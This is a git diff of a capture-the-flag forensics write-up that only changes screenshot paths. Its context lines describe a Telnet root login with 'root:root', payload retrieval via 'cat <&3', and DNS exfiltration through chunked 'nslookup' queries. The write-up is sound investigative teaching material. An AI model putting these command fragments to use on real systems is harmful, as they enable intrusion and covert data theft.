@@ -45,7 +45,7 @@ Open Wireshark and test each suspicious IP, only one has active traffic : a Teln
 
 You can also notice in `auth.log` that the attacker's event is the only one that says `telnetd` instead of `sshd`, and the only one that shows a successful `ROOT LOGIN` which immediately flags suspicious behaviour
 
-![alt text](1.jpg)
+![alt text](screenshots/1.jpg)
 
 > **Answer: `82.115.47.23`**
 
@@ -73,13 +73,13 @@ Since we know the attacker used "Telnet" protocol to gain root access, we can as
 
 Filter in Wireshark: `tcp.port == 23` OR `telnet`
 
-![alt text](2.jpg)
+![alt text](screenshots/2.jpg)
 
 Right-click any packet → Follow → TCP Stream.
 
 Since Telnet has no encryption, everything is in plain text, The credentials are immediately visible 
 
-![alt text](3.jpg)
+![alt text](screenshots/3.jpg)
 
 > **Answer: `root:root`**
 
@@ -115,7 +115,7 @@ cat <&3 | tail -n +8
 
 To verify, filter: `ip.addr == 82.115.47.23 && tcp.port == 80` and follow the TCP stream. Count the HTTP response headers before the script body begins, there are exactly 8.
 
-![alt text](4.jpg)
+![alt text](screenshots/4.jpg)
 
 > **Answer: `8`**
 
@@ -149,7 +149,7 @@ nslookup $SUBDOMAIN > /dev/null 2>&1
 
 You can confirm this in the pcap by filtering: `dns && ip.src == 192.168.1.105`
 
-![alt text](5.jpg)
+![alt text](screenshots/5.jpg)
 
 > **Answer: `DNS exfiltration`**
 
@@ -183,7 +183,7 @@ Still filtered on `dns && ip.src == 192.168.1.105`, count only the queries hitti
 
 This also matches `CHUNK_SIZE=8` in the script — the encoded token is 44 characters long, split into 8-character chunks gives 6 queries.
 
-![alt text](6.jpg)
+![alt text](screenshots/6.jpg)
 
 > **Answer: `6`**
 
